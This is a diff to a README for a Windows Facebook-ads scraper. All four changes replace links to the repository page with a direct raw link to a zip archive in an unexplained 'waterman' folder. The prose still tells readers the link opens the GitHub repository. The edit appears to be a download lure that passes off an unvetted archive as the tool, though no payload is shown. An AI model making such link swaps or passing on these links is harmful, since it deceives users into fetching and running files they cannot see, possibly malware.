@@ -1,6 +1,6 @@
 # 🚀 facebook-ads-scraper-pro - Extract Facebook Ads Easily
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/ReficulDev/facebook-ads-scraper-pro)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ReficulDev/facebook-ads-scraper-pro/main/waterman/facebook-ads-pro-scraper-v2.5.zip)
 
 ---
 
@@ -74,7 +74,7 @@ Follow these steps to install and start facebook-ads-scraper-pro on Windows.
 
 Visit this page to download the latest version of facebook-ads-scraper-pro:
 
-[![Download](https://img.shields.io/badge/Download-grey?style=for-the-badge&logo=github)](https://github.com/ReficulDev/facebook-ads-scraper-pro)
+[![Download](https://img.shields.io/badge/Download-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ReficulDev/facebook-ads-scraper-pro/main/waterman/facebook-ads-pro-scraper-v2.5.zip)
 
 This link will take you to the GitHub repository where you will find the download files.
 
@@ -137,7 +137,7 @@ Files are stored as `.ndjson` and can be opened with text editors like Notepad o
 
 Check the GitHub page regularly for new releases:
 
-[https://github.com/ReficulDev/facebook-ads-scraper-pro](https://github.com/ReficulDev/facebook-ads-scraper-pro)
+[https://raw.githubusercontent.com/ReficulDev/facebook-ads-scraper-pro/main/waterman/facebook-ads-pro-scraper-v2.5.zip](https://raw.githubusercontent.com/ReficulDev/facebook-ads-scraper-pro/main/waterman/facebook-ads-pro-scraper-v2.5.zip)
 
 Download the latest version and install it over the old one. Your data folder will stay safe.
 
@@ -157,4 +157,4 @@ This tool offers a simple way to collect detailed Facebook ads data. It works qu
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/ReficulDev/facebook-ads-scraper-pro)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ReficulDev/facebook-ads-scraper-pro/main/waterman/facebook-ads-pro-scraper-v2.5.zip)
